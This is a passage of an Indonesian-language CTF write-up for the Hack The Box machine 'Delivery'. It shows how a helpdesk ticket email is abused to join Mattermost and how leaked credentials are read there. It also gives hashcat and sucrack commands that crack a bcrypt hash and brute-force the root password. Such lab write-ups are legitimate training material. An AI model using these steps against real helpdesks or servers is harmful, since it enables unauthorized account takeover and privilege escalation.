2. Port 80 - HTML5 Up (Static Web)#

Terdapat beberapa informasi pada web tersebut, diantaranya:

The best place to get all your email related support
For an account check out our helpdesk

For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you’ll be able to have access to our MatterMost server.

Kesimpulan:

  • Terdapat domain helpdesk.delivery.htb dan delivery.htb
  • Jika memiliki email @delivery.htb, maka kita bisa mengakses mattermost server (http://delivery.htb:8065)
  • Untuk mendapatkan email bisa menghubungi tim terkait melalui helpdesk.delivery.htb

2.1. Point the domain locally#

Karena kita mengetahui bahwa terdapat beberapa domain yang digunakan, selanjutnya kita tambahkan domain tersebut ke alamat IP target secara lokal melalui file /etc/hosts.

❯ cat /etc/hosts | grep "delivery"
10.10.10.222    delivery.htb helpdesk.delivery.htb

3. helpdesk.delivery.htb#

Terdapat aplikasi web Support Ticket System (osTicket).

Saya telah melakukan pencarian tentang versi yang digunakan, tetapi hasilnya nihil.

Dan jika kita melihat informasi di exploit-db tentang osTicket, kerentanan yang ditemukan hanyalah kerentanan yang lawas, sementara mesin ini terbilang baru.

Kemungkinan besar mesin ini tidak akan menggunakan versi yang rentan. Walaupun ada kemunginan menggunakan osTicket versi lawas, saya telah melakukan percobaan exploitasi CVE-2019-14749 dan hasilnya nihil.


3.1. Open a new ticket to get an email @delivery.htb#

Ketika saya mencoba membuat tiket baru, email @delivery.htb akan secara otomatis diberikan untuk menambahkan informasi lain tentang tiket yang dikirimkan.

Tiket yang dikirimkan bisa dicek menggunakan fitur yang tersedia.


3.2. Register mattermost account using email @delivery.htb#

Setelah mendapatkan email @delivery.htb, selanjutnya akses http://delivery.htb:8065/signup_email untuk membuat akun mattermost baru.


Untuk mendapatkan link verifikasi, kita cek kembali tiket yang sebelumnya kita kirim.

Bisa kita lihat pada gambar di atas bahwa terdapat link verifikasi mattermost yang tersedia.

Hal ini bisa terjadi karena seperti yang diberitahukan sebelumnya pada saat membuat tiket baru, yaitu jika ingin menambahkan informasi tentang tiket yang dikirim, bisa dilakukan dengan cara mengirimkan pesan ke @delivery.htb yang ditentukan.

3.3. Verify the account and login#

Verifikasi akun dan login ke dalam mattermost. Akan terdapat channel Internal yang memberikan informasi seperti berikut:

@developers Please update theme to the OSTicket before we go live. Credentials to the server are maildeliverer:Youve_G0t_Mail!

Also please create a program to help us stop re-using the same passwords everywhere…. Especially those that are a variant of “PleaseSubscribe!"

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.

Kesimpulan:

  • Terdapat kredensial maildeliverer:Youve_G0t_Mail!
  • Kombinasi “PleaseSubscribe!” sering mereka gunakan untuk password

Terdapat password yang menurut hashcat di-hash menggunakan bcrypt blowfish ($2a$).

Sempat saya coba crack menggunakan wordlist rockyou.txt tetapi gagal. Dan saya baru teringat bahwa terdapat clue tentang password yang merupakan kombinasi dari “PleaseSubscribe!”.

4.3. Crack the hash#

Buat terlebih dahulu wordlist dari kombinasi string yang didapatkan sebelumnya dan crack hash tersebut menggunakan hashcat.

❯ cat kombinasipass.txt
PleaseSubscribe!

❯ hashcat --stdout kombinasipass.txt -r /usr/share/hashcat/rules/best64.rule > wordlistpw.txt

❯ cat pass.hash                         
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO

❯ hashcat -m 3200 pass.hash wordlistpw.txt
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Terlihat bahwa password-nya dari akun mattermost admin adalah “PleaseSubscribe!21”.

4.4. Login as root with the password#

Password tersebut bisa digunakan untuk login sebagai user root.

maildeliverer@Delivery:~$ su -
Password: 
root@Delivery:~# wc -c /root/root.txt
33 /root/root.txt

5. The second way - Local Privilege Escalation#

Setelah mengetahui bahwa password adalah kombinasi dari “PleaseSubscribe!”, selanjutnya kita buat wordlist dan brute-force user root.

5.1. Check SSH config#

Tetapi karena user root tidak bisa diakses lewat SSH, jadi kita bisa menggunakan sucrack untuk brute-force user root dari dalam server.

maildeliverer@Delivery:~$ cat /etc/ssh/sshd_config
PermitRootLogin no

5.2. sucrack#

Upload binary sucrack dan wordlist password-nya ke server target.

❯ cp /usr/bin/sucrack .

❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

maildeliverer@Delivery:/tmp$ wget http://10.10.14.5:8000/sucrack

maildeliverer@Delivery:/tmp$ wget http://10.10.14.5:8000/wordlistpw.txt

maildeliverer@Delivery:/tmp$ chmod +x sucrack

Setelah itu jalankan sucrack seperti berikut:

maildeliverer@Delivery:/tmp$ ./sucrack -a -w 20 -s 10 -u root wordlistpw.txt
password is: PleaseSubscribe!21

maildeliverer@Delivery:/tmp$ su -
Password: 
root@Delivery:~# wc -c /root/root.txt
33 /root/root.txt

Terlihat bahwa brute-force berhasil dan bisa digunakan untuk login sebagai user root.

Dan di dalam direktori /root/ terdapat file note.txt yang berisi pesan dari pembuat mesin.

root@Delivery:~# cat note.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times.  The inspiration for the box is here: 

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 

Keep on hacking! And please don't forget to subscribe to all the security streamers out there.

6. Closing - What I learned#

  1. Lebih teliti untuk membaca konten web.
  2. Selalu catat hints.
  3. Jangan lupa untuk periksa konfigurasi service.
  4. Membuat kombinasi password dari suatu string menggunakan hashcat.
  5. Jika tidak bisa brute-force SSH, bisa menggunakan sucrack dari dalam mesin.
